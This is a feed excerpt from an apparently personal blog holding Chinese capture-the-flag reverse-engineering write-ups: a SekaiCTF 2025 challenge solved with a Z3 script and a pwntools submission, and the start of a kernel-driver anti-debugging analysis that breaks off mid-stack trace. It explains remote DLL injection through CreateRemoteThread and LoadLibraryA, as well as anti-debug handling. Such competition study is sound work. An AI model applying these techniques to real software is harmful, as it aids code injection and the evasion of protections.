class="built_in">print</span>(file_path)</span><br><span class="line">        file_path.write_text(code)</span><br><span class="line"></span><br><span class="line">        completed = subprocess.run(</span><br><span class="line">            [<span class="built_in">str</span>(launch_exe.resolve()), <span class="built_in">str</span>(file_path.resolve())],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            text=<span class="literal">True</span>,</span><br><span class="line">            cwd=cwd,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        sys.stdout.write(<span class="string">&#x27;=== cl.exe ===\n&#x27;</span>)</span><br><span class="line">        sys.stdout.write(completed.stdout.replace(cwd + <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="launch-exe"><a href="#launch-exe" class="headerlink" title="launch.exe"></a>launch.exe</h3><p>main函数，创建运行<code>cl.exe</code>，传入编译参数以及server.py传来的源码路径。</p><p><img src="/2025/08/19/SekaiCTF2025/image-13.png" alt="alt text"></p><p>加载本地<code>plugin.dll</code>，在<code>cl.exe</code>远程申请内存空间，然后将<code>plugin.dll</code>内存数据写到<code>cl.exe</code>进程中，再使用<code>CreateRemoteThread</code>远程调用<code>cl.exe</code>中的<code>LoadLibraryA</code>函数，加载运行刚刚写入的<code>plugin.dll</code>，这个操作也就是所谓的远程注入DLL。</p><p><img src="/2025/08/19/SekaiCTF2025/image-14.png" alt="alt text"></p><h3 id="plugin-dll"><a href="#plugin-dll" class="headerlink" title="plugin.dll"></a>plugin.dll</h3><p>查看字符串，可以找到调用该字符串的函数。</p><p><img src="/2025/08/19/SekaiCTF2025/image-15.png" alt="alt text"></p><p>往函数上层走，可以看到这边使用了Hook，方框处是被Hook函数地址，箭头处是Hook调用函数。</p><p><img src="/2025/08/19/SekaiCTF2025/image-16.png" alt="alt text"></p><p>在下面箭头的函数中可以看到另外两个Hook，针对<code>clxx.dll</code>和<code>c2.dll</code>DLL的Hook，Hook调用函数都是同一个，也就是第一张输出Flag的地方。</p><p><img src="/2025/08/19/SekaiCTF2025/image-17.png" alt="alt text"></p><p>接下来就是对<code>cl.exe</code>的动调，因为该<code>plugin.dll</code>是注入到该进程的。</p><p>动调方法：传参源码目录运行<code>launch.exe</code>，然后断点在注入前的代码，使用<code>plugin.dll</code>的IDA项目附加到当前运行中的<code>cl.exe</code>，然后再运行<code>launch.exe</code>的断点，<code>plugin.dll</code>那边的IDA就会断下。</p><p>可以看到Hook了<code>c2.dll</code>中的某个函数，开头jmp到自己的函数中。</p><p><img src="/2025/08/19/SekaiCTF2025/image-18.png" alt="alt text"></p><p>发现Hook函数这边进来，也就输出Flag的函数中，将被Hook函数执行得到的结果传入。</p><p>通过输入不同的solution.cpp代码来调试，发现数据结构如下（下文会提到如何得到），第一个int是不同代码对应的编码，第二个int16是用来计算的操作数，最后的int16是未知数据，没用到这边不管。</p><p><img src="/2025/08/19/SekaiCTF2025/image-23.png" alt="alt text"></p><p>此处v3是输入进来的一个<code>CodeType</code>的链式数组结构，对应的是solution.cpp编译过程中不同类型代码对应的数据，v5是全局<code>CodeType</code>数组，v5与v3的代码编码进行循环判断当前v3代码是哪个类型，最后取出对应代码编码的操作码。</p><p><img src="/2025/08/19/SekaiCTF2025/image-19.png" alt="alt text"></p><p>使用上面全局取出的对应代码编码的操作码，对另一个全局数组进行–或者++操作。</p><p>下面+1LL那行代码实际就是通过操作计算得到对应全局数组的指针，然后++。</p><p><img src="/2025/08/19/SekaiCTF2025/image-20.png" alt="alt text"></p><p><img src="/2025/08/19/SekaiCTF2025/image-21.png" alt="alt text"></p><p>最后全局数组++–计算完的结果要与另一个目标数组数据完全相等，然后输出Flag。</p><p><img src="/2025/08/19/SekaiCTF2025/image-22.png" alt="alt text"></p><p>从全局的编码数据来看，一共有9种用到的不同的代码编码，且操作数不一定相等，可以通过输入各种solution.cpp代码，来动调计算，看看不同的代码编码会对<code>qword_7FFE52FA9AB0</code>的全局数据哪几个下标数据进行–以及++。</p><p><img src="/2025/08/19/SekaiCTF2025/image-24.png" alt="alt text"></p><p>被计算的全局数组数据以及最终目标数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Original = [<span class="number">0x734</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xBBC</span>, <span class="number">0x0</span>, <span class="number">0xB63</span>]</span><br><span class="line"></span><br><span class="line">Dest = [<span class="number">0x14D</span>, <span class="number">0x2D7</span>, <span class="number">0x161</span>, <span class="number">0x2EA</span>, <span class="number">0x1B1</span>, <span class="number">0x2FD</span>, <span class="number">0x169</span>]</span><br></pre></td></tr></table></figure><h4 id="代码编码分析"><a href="#代码编码分析" class="headerlink" title="代码编码分析"></a>代码编码分析</h4><p>以下是不同solution.cpp代码在编译中Hook函数取到的对应CodeType数据，也就是上面的v3指针中的数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">a</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">void</span> (*)()&gt;(<span class="literal">nullptr</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">933 -&gt; function def</span></span><br><span class="line"><span class="comment">939</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">899 -&gt; call()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">86c -&gt; return 0;</span></span><br><span class="line"><span class="comment">89b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">93a</span></span><br><span class="line"><span class="comment">931</span></span><br><span class="line"><span class="comment">934</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">a</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">933</span></span><br><span class="line"><span class="comment">939</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">852 -&gt; int b;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">86c -&gt; return 0;</span></span><br><span class="line"><span class="comment">89b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">93a</span></span><br><span class="line"><span class="comment">931</span></span><br><span class="line"><span class="comment">934</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">a</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">933</span></span><br><span class="line"><span class="comment">939</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">86c -&gt; return 0;</span></span><br><span class="line"><span class="comment">89b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">86c -&gt; return 0;</span></span><br><span class="line"><span class="comment">89b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">93a</span></span><br><span class="line"><span class="comment">931</span></span><br><span class="line"><span class="comment">934</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">a</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">933</span></span><br><span class="line"><span class="comment">939</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">939</span></span><br><span class="line"><span class="comment">93a</span></span><br><span class="line"><span class="comment">89b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">93a -&gt; end of &#123;&#125;</span></span><br><span class="line"><span class="comment">931</span></span><br><span class="line"><span class="comment">934</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">a</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">throw</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">933</span></span><br><span class="line"><span class="comment">939</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">84f</span></span><br><span class="line"><span class="comment">84f</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">899 -&gt; call</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8a2 -&gt; throw</span></span><br><span class="line"><span class="comment">89b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">93a</span></span><br><span class="line"><span class="comment">931</span></span><br><span class="line"><span class="comment">931</span></span><br><span class="line"><span class="comment">934</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>通过上面几个不同代码的交叉分析，可以得到一些代码编码对应的实际代码类型，共有9种代码编码，这边只识别出其中6种。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x91e</span> -&gt; unk</span><br><span class="line"><span class="number">0x8a3</span> -&gt; unk</span><br><span class="line"><span class="number">0x917</span> -&gt; unk</span><br><span class="line"></span><br><span class="line"><span class="number">0x852</span> -&gt; <span class="type">int</span> b;</span><br><span class="line"><span class="number">0x8a2</span> + <span class="number">0x899</span> -&gt; <span class="keyword">throw</span>;</span><br><span class="line"><span class="number">0x899</span> -&gt; <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">void</span>(*)()&gt;(<span class="literal">nullptr</span>)();</span><br><span class="line"><span class="number">0x86c</span> -&gt; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">0x933</span> -&gt; <span class="function"><span class="type">int</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">0x93a</span> -&gt; &#123;&#125;</span><br></pre></td></tr></table></figure><p>然后就是动调不同代码编码对应的计算操作。</p><p>一共动调到7种编码，另外两个没有识别的并没有动调到过，第一个数组是对全局数组进行++的下标，第二个数组是对全局数组进行–的下标。</p><p>发现下面已经识别出的6种代码编码对应的操作中，已经包含0-6所有下标的计算，所以理论上可以仅通过这六个代码编码使用Z3求出各个代码所需要的数量，让所有代码编码进行计算后，全局数组数据会符合目标数组数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#123;code, add_index, dec_index&#125;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="number">0x91e</span>, &#123;<span class="number">6</span>&#125;, &#123;<span class="number">0</span>,<span class="number">4</span>&#125;&#125;,</span><br><span class="line"></span><br><span class="line">&#123;<span class="number">0x852</span>, &#123;<span class="number">2</span>&#125;, &#123;<span class="number">4</span>,<span class="number">6</span>&#125;&#125;,</span><br><span class="line">&#123;<span class="number">0x8a2</span>, &#123;<span class="number">1</span>&#125;, &#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>&#125;&#125;,</span><br><span class="line">&#123;<span class="number">0x899</span>, &#123;<span class="number">3</span>&#125;, &#123;<span class="number">0</span>,<span class="number">6</span>&#125;&#125;,</span><br><span class="line">&#123;<span class="number">0x86c</span>, &#123;<span class="number">5</span>&#125;, &#123;<span class="number">0</span>,<span class="number">4</span>&#125;&#125;,</span><br><span class="line">&#123;<span class="number">0x933</span>, &#123;<span class="number">5</span>&#125;, &#123;<span class="number">0</span>,<span class="number">6</span>&#125;&#125;,</span><br><span class="line">&#123;<span class="number">0x93a</span>, &#123;<span class="number">5</span>&#125;, &#123;<span class="number">0</span>,<span class="number">4</span>&#125;&#125;,</span><br></pre></td></tr></table></figure><h3 id="Z3求解目标代码"><a href="#Z3求解目标代码" class="headerlink" title="Z3求解目标代码"></a>Z3求解目标代码</h3><p>使用Z3求解各个不同代码编码所需要的代码数量。</p><p><strong>注：上文分析中throw命令会占用0x8a2和0x899两个代码编码，而0x899又是Call的编码，所以最后所需Call的代码数量要减去throw的代码数量，因为throw已经帮Call占用了一部分计算</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数值代码对应的字符串，以及加一的下标和减一的下标</span></span><br><span class="line"><span class="comment"># code (string, add_index, dec_index)</span></span><br><span class="line">code_map = &#123;</span><br><span class="line">    <span class="number">0x852</span>: (<span class="string">&quot;int b&quot;</span>, &#123;<span class="number">2</span>&#125;, &#123;<span class="number">4</span>, <span class="number">6</span>&#125;),</span><br><span class="line">    <span class="number">0x8a2</span>: (<span class="string">&quot;throw;&quot;</span>, &#123;<span class="number">1</span>&#125;, &#123;<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>&#125;),</span><br><span class="line">    <span class="number">0x899</span>: (<span class="string">&quot;reinterpret_cast&lt;void(*)()&gt;(nullptr)();&quot;</span>, &#123;<span class="number">3</span>&#125;, &#123;<span class="number">0</span>, <span class="number">6</span>&#125;),</span><br><span class="line">    <span class="number">0x86c</span>: (<span class="string">&quot;return 0;&quot;</span>, &#123;<span class="number">5</span>&#125;, &#123;<span class="number">0</span>, <span class="number">4</span>&#125;),</span><br><span class="line">    <span class="number">0x933</span>: (<span class="string">&quot;int a()&#123;&quot;</span>, &#123;<span class="number">5</span>&#125;, &#123;<span class="number">0</span>, <span class="number">6</span>&#125;),</span><br><span class="line">    <span class="number">0x93a</span>: (<span class="string">&quot;&#123;&#125;&quot;</span>, &#123;<span class="number">5</span>&#125;, &#123;<span class="number">0</span>, <span class="number">4</span>&#125;),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始值</span></span><br><span class="line">Original = [<span class="number">0x734</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xBBC</span>, <span class="number">0x0</span>, <span class="number">0xB63</span>]</span><br><span class="line"><span class="comment"># 目标值</span></span><br><span class="line">Dest = [<span class="number">0x14D</span>, <span class="number">0x2D7</span>, <span class="number">0x161</span>, <span class="number">0x2EA</span>, <span class="number">0x1B1</span>, <span class="number">0x2FD</span>, <span class="number">0x169</span>]</span><br><span class="line"></span><br><span class="line">counts = &#123;code: Int(<span class="string">f&quot;c_<span class="subst">&#123;code:x&#125;</span>&quot;</span>) <span class="keyword">for</span> code <span class="keyword">in</span> code_map.keys()&#125;</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code_variable <span class="keyword">in</span> counts.values():</span><br><span class="line">    solver.add(code_variable &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给对应下标的全局数组数据进行++或--操作</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Original)):</span><br><span class="line">    equation = Original[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> code, (_, inc_indices, dec_indices) <span class="keyword">in</span> code_map.items():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> inc_indices:</span><br><span class="line">            equation += counts[code]</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dec_indices:</span><br><span class="line">            equation -= counts[code]</span><br><span class="line"></span><br><span class="line">    solver.add(equation == Dest[i])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数声明开头数量只能1</span></span><br><span class="line">solver.add(counts[<span class="number">0x933</span>] == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    </span><br><span class="line">    results = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> code, var <span class="keyword">in</span> counts.items():</span><br><span class="line">        results[code] = model.evaluate(var).as_long()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;solution.cpp&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># int a()&#123;</span></span><br><span class="line">        file.write(code_map[<span class="number">0x933</span>][<span class="number">0</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># int b = 0;</span></span><br><span class="line">        int_count = results[<span class="number">0x852</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(int_count):</span><br><span class="line">            file.write(code_map[<span class="number">0x852</span>][<span class="number">0</span>]+<span class="built_in">str</span>(i)+<span class="string">&#x27; = 0;\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># throw;</span></span><br><span class="line">        throw_count = results[<span class="number">0x8a2</span>]</span><br><span class="line">        file.write((code_map[<span class="number">0x8a2</span>][<span class="number">0</span>]+<span class="string">&#x27;\n&#x27;</span>) * (throw_count))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># return 0;</span></span><br><span class="line">        ret_count = results[<span class="number">0x86c</span>]</span><br><span class="line">        file.write((code_map[<span class="number">0x86c</span>][<span class="number">0</span>]+<span class="string">&#x27;\n&#x27;</span>) * (ret_count))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># reinterpret_cast&lt;void(*)()&gt;(nullptr)();</span></span><br><span class="line">        <span class="comment"># throw命令包含一次Call命令，所以减去throw的数量</span></span><br><span class="line">        call_count = results[<span class="number">0x899</span>]</span><br><span class="line">        file.write((code_map[<span class="number">0x899</span>][<span class="number">0</span>]+<span class="string">&#x27;\n&#x27;</span>) * (call_count - throw_count))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># &#123;&#125;</span></span><br><span class="line">        <span class="comment"># 数量-1，因为整个函数的结尾&#125;也占一个0x93a</span></span><br><span class="line">        trunk_count = results[<span class="number">0x93a</span>]</span><br><span class="line">        file.write((code_map[<span class="number">0x93a</span>][<span class="number">0</span>]+<span class="string">&#x27;\n&#x27;</span>) * (trunk_count-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># last &#125;</span></span><br><span class="line">        file.write(<span class="string">&quot;&#125;\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found.&quot;</span>)</span><br></pre></td></tr></table></figure><p>最后得到的目标代码文件目录传到launch.exe即可输出Flag。</p><p><img src="/2025/08/19/SekaiCTF2025/image-25.png" alt="alt text"></p><h3 id="代码发送获得Flag"><a href="#代码发送获得Flag" class="headerlink" title="代码发送获得Flag"></a>代码发送获得Flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;solution.cpp&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    code = file.read()</span><br><span class="line">    </span><br><span class="line">    io = remote(<span class="string">&#x27;alchemy-master.chals.sekai.team&#x27;</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    io.send(code)</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b&#x27;__END__&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><p><img src="/2025/08/19/SekaiCTF2025/image-26.png" alt="alt text"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SekaiCTF-2025-Reverse-WP&quot;&gt;&lt;a href=&quot;#SekaiCTF-2025-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;SekaiCTF 2025 Reverse WP&quot;&gt;&lt;/a&gt;SekaiCTF 2025 </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NepCTF2025 XSafe WP</title>
    <link href="https://tkazer.github.io/2025/07/31/NepCTF2025-XSafe/"/>
    <id>https://tkazer.github.io/2025/07/31/NepCTF2025-XSafe/</id>
    <published>2025-07-31T12:28:40.000Z</published>
    <updated>2025-07-31T14:30:20.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Reverse-XSafe"><a href="#Reverse-XSafe" class="headerlink" title="Reverse XSafe"></a>Reverse XSafe</h1><p>这题是这次比赛的零解驱动题，赛中看到是混淆就没有分析太多，赛后花了半天时间手动动调还是调出来了，难度就是在代码强混淆下动调分析数据（🐥神的混淆太狠了）。</p><h1 id="R3"><a href="#R3" class="headerlink" title="R3"></a>R3</h1><p>R3层程序代码很简单，就是输入字符串然后写入到自己进程的固定一个地址，这边就可以猜到是R0驱动通过一些手段直接访问该进程，获取到存在固定地址中的字符串进行校验。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image.png" alt="alt text"></p><h1 id="R0"><a href="#R0" class="headerlink" title="R0"></a>R0</h1><p>DriverEntry进来这边是原入口，可以发现被混淆了，并不能分析出来什么。</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-1.png" alt="alt text"></p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-2.png" alt="alt text"></p><h2 id="反调试处理"><a href="#反调试处理" class="headerlink" title="反调试处理"></a>反调试处理</h2><p>由于驱动存在反调试，第一步便是要去除反调试。</p><p>最快的方法就是直接加载驱动，然后让他触发反调试导致蓝屏，这时就可以通过调用栈找到反调试的地方。</p><p>加载驱动，蓝屏触发，</p><p><img src="/2025/07/31/NepCTF2025-XSafe/image-3.png" alt="alt text"></p><p>使用kb命令查看堆栈，发现是调用了KeBugCheckEx触发蓝屏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; kb</span><br><span class="line"> # RetAddr               : Args to Child                                                           : Call Site</span><br><span class="line">00 fffff803`4e118832     : ffffec83`b4fadee0 fffff803`4df7e210 00000000`00000d00 00000000`00000000 : nt!DbgBreakPointWithStatus</span><br><span class="line">01 fffff803`4e117e16     : 00000000`00000003 ffffec83`b4fadee0 fffff803`4e015e50 00000000`00000d1e : nt!KiBugCheckDebugBreak+0x12</span><br><span class="line">02 fffff803`4dffdf07     : ffffec83`b4fae430 ffffec83`b4fae470 ffffec83`b4fae5a0 ffffec83`b4fae460 : nt!KeBugCheck2+0x946</span><br><span class="line">03 fffff803`4cab6f5c     : 00000000`00000d1e 78696130`6a693233 00000000`00000033 00000000`00000000 : nt!KeBugCheckEx+0x107</span><br><span class="line">04 fffff803`4cab4f22     : ffffec83`b4fae840 ffffec83`b4fae680 fffff803`4cab58ec fffff803`4cab4f18 : XSafe_____!malloc+0x5f5c</span><br><span class="line">05 fffff803`4cc0c242     : 00000216`4229d9e0 00000216`4229d510 fffff803`4cc0b2ca 00000000`00000001 : XSafe_____!malloc+0x3f22</span><br><span class="line">06 fffff803`4cb48b0e     : 00000000`01000010 00000000`00040293 fffff803`4cb48a32 fffff803`4cb48aa9 : XSafe_____!malloc+0x15b242</span><br><span class="line">07 fffff803`4cac6a64     : 00000000`00000000 fffff803`516bd536 fffff803`4cac69c7 fffff803`4cac6a19 : XSafe_____!malloc+0x97b0e</span><br><span class="line">08 fffff803`4cbf4dcf     : 00000000`00000000 00000000`00000000 ffffc78e`be4ff000 ffffc78e`bee5c9c0 : XSafe_____!malloc+0x15a64</span><br><span class="line">09 fffff803`4cbf4e80     : ffffc78e`be4ff000 ffffec83`b4fb1a60 